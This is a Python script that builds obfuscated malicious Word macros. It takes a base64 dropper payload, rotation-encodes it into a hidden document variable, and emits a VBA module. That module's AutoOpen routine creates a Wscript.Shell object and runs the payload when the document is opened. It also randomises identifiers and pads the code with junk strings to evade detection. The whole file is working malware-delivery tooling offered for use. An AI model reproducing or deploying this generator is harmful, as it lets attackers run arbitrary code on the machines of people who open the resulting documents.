import re
import random
import base64

def __ascii_encode_and_rot__(string, rotation):
    result = list()
    for i in string:
        shiftedcharacter = str(int(ord(i)) + rotation)
        if len(shiftedcharacter) == 1:
            result.append('00' + str(shiftedcharacter))
        elif len(shiftedcharacter) == 2:
            result.append('0' + str(shiftedcharacter))
        else:
            result.append(str(shiftedcharacter))
    return ''.join(result)

def generate(dropperbase64):
    playbook = list()  # this will be passed back, as more must be done with the document than just insert
                                     # the VBA
    rot_offset = random.randint(5, 20)

    decodedpayload = base64.b64decode(dropperbase64).decode("utf-8")
    encodedpayload = __ascii_encode_and_rot__(decodedpayload, rot_offset)

    wscript_shell = __ascii_encode_and_rot__("Wscript.Shell", rot_offset)

    vba_template = '''Function afun2()
    Dim cvar1 As String
    cvar1 = "aspecial2"
    cvar1 = "096124108123114121125055092113110117117" ' debug
    Debug.Print afun1(cvar1) ' debug
    Dim avar5 As Object: Set avar5 = VBA.CreateObject(afun1(cvar1))
    Dim avar6 As String
    avar6 = "arandom1"
    Dim avar7 As String
    avar7 = "arandom2"
    Dim avar8 As String
    avar8 = "arandom3"
    Dim avar9 As String
    avar9 = "arandom4"
    Dim bvar1 As String
    bvar1 = "arandom5"
    Dim bvar2 As String
    bvar2 = "arandom6"
    Dim bvar3 As String
    bvar3 = "arandom7"
    Dim bvar4 As String
    bvar4 = "arandom8"
    Dim bvar5 As String
    bvar5 = "arandom9"

    avar5.Exec afun1(ActiveDocument.Variables("aspecial1"))
End Function

Sub AutoOpen()
    Application.Run "afun2"

End Sub

Public Function afun1(ByVal avar1 As String)

    For avar2 = 1 To Len(avar1) Step 3
        avar4 = Mid(avar1, avar2, 3)
        avar3 = avar3 + Chr(Int(avar4) - aspecial3)
    Next

afun1 = avar3

End Function

'''
    letterlist = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
                  "T", "U", "V", "W", "X", "Y", "Z"]

    listofallgrammar = list()

    pattern = re.compile(r'[a-z]var[0-9]')
    for i in re.findall(pattern, vba_template):

        lookingforcandidate = 1

        while lookingforcandidate == 1:
            if random.randint(1, 3) == 1:
                candidate = random.choice(letterlist) + random.choice(letterlist) + "_" + random.choice(letterlist) * 2
            else:
                candidate = random.choice(letterlist) + "_" + random.choice(letterlist) + random.choice(letterlist)

            if candidate not in listofallgrammar:
                listofallgrammar.append(candidate)
                lookingforcandidate = 0
                vba_template = vba_template.replace(i, candidate)

    pattern = re.compile(r'[a-z]val[0-9]')
    for i in re.findall(pattern, vba_template):
        pass
        # print(i)

    pattern = re.compile(r'[a-z]fun[0-9]')
    for i in re.findall(pattern, vba_template):

        lookingforcandidate = 1

        while lookingforcandidate == 1:
            if random.randint(1, 3) == 1:
                candidate = random.choice(letterlist) + random.choice(letterlist) + "_" + random.choice(
                    letterlist) * 2
            else:
                candidate = random.choice(letterlist) + "_" + random.choice(letterlist) + random.choice(letterlist)

            if candidate not in listofallgrammar:
                listofallgrammar.append(candidate)
                lookingforcandidate = 0
                vba_template = vba_template.replace(i, candidate)

    pattern = re.compile(r'[a-z]random[0-9]')
    for i in re.findall(pattern, vba_template):
        garbage = ""
        while len(garbage) < 72:
            garbage = garbage + (random.choice(letterlist) + str(random.randint(0, 9)))
        vba_template = vba_template.replace(i, garbage)

    pattern = re.compile(r'[a-z]special[0-9]')
    for i in re.findall(pattern, vba_template):
        lookingforcandidate = 1

        while lookingforcandidate == 1:
            if random.randint(1, 3) == 1:
                candidate = random.choice(letterlist) + random.choice(letterlist) + "_" + random.choice(letterlist) * 2
            else:
                candidate = random.choice(letterlist) + "_" + random.choice(letterlist) + random.choice(letterlist)

            if candidate not in listofallgrammar:
                if i == 'aspecial1':
                    listofallgrammar.append(candidate)
                    lookingforcandidate = 0
                    vba_template = vba_template.replace(i, candidate)
                    playbook.append({'add_doc_var': {'name': candidate, 'value': encodedpayload}})

                elif i == 'aspecial2':
                    listofallgrammar.append(candidate)
                    lookingforcandidate = 0
                    vba_template = vba_template.replace(i, wscript_shell)
                elif i == 'aspecial3':
                    lookingforcandidate = 0
                    vba_template = vba_template.replace(i, str(rot_offset))

    pattern = re.compile(r'.*\S debug\n')
    for i in re.findall(pattern, vba_template):
        vba_template = vba_template.replace(i, '')

    playbook.append({'add_vba_module': vba_template})

    return playbook
